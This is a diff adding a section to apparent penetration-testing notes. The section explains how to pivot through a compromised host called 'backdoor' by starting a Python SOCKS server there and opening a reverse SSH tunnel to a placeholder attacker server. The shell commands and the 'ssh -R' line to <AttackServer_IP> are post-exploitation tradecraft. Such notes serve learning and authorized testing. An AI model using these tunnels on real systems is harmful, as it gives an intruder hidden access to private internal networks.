@@ -199,3 +199,22 @@ chmod +x /root/reload.sh
 - Day of the month (*): Every day of the month.
 - Month (*): Every month.
 - Day of the week (*): Every day of the week.
+
+## SSH tunneling with SOCKS proxy
+
+If Nmap shows a local webpage running on port 80, it might be challenging to access it directly through our backdoor. One way to handle this is by setting up a SOCKS proxy using the following script:
+
+```
+root@backdoor:~# wget https://github.com/k3idii/python-socks-server
+root@backdoor:~# cd python-socks-server
+root@backdoor:~/python-socks-server# python server-basic.py &
+2020-03-28 10:10 [INFO] Will listen on [127.0.0.1:9876]
+```
+
+The Python SOCKS server script (server-basic.py) is being started in the background (&), which means it will run independently of the terminal session. It listens on localhost (127.0.0.1) port 9876 for SOCKS proxy connections. Ensure that you have Python installed and any dependencies required by the script are satisfied before running it.
+
+In order to make this reachable from the outside, we need to utilize SSH tunneling again.
+
+By running the command **ssh -nNT -R 7777:localhost:9876 <AttackServer_IP>** on the backdoor, port 7777 is opened on the AttackServer and connected to port 9876 on the backdoor. This configuration allows the SOCKS program on the backdoor to forward packets to any target of our choice.
+
+Don't forget to adjust Firefox to use this tunnel (SOCKS host: 127.0.0.1, SOCKSv5, port 7777).
